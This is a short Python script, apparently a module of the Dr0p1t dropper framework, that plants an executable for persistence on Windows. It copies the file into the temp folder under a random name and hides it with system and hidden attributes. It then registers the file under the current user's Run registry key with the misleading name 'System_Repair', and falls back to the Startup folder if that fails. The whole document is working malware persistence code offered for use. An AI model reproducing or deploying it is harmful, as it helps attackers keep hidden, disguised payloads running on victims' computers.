#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
#This script aims to to add your exe file to startup registry key
#Start
from winreg import OpenKey,HKEY_CURRENT_USER,KEY_ALL_ACCESS,SetValueEx,REG_SZ
from os import path,popen,rename
from random import randint

def random_name():
    return "Ss" + str(randint(10,100))

def F4241( old,new ):
    old_file = open( old,"rb" )
    new_file = open( new,"wb" )
    old_data = old_file.read()
    new_file.write( old_data )
    old_file.close()
    new_file.close()
    blahah = popen( "attrib +s +h " + new ) #hiding the file

def F7212(exe):
    fp = popen("echo %temp%").read().strip()
    new_name = random_name()
    new_file_path = fp + "\\" + new_name +".exe"
    F4241( exe,new_file_path )
    keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'
    try:
        key2change = OpenKey(HKEY_CURRENT_USER,keyVal,0,KEY_ALL_ACCESS)
        x1 = SetValueEx(key2change, "System_Repair",0,REG_SZ, new_file_path)
    except:
        x1 = rename( new_file_path, os.path.expandvars("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{}".format( new_name +".exe" ) ) )

F7212(File)
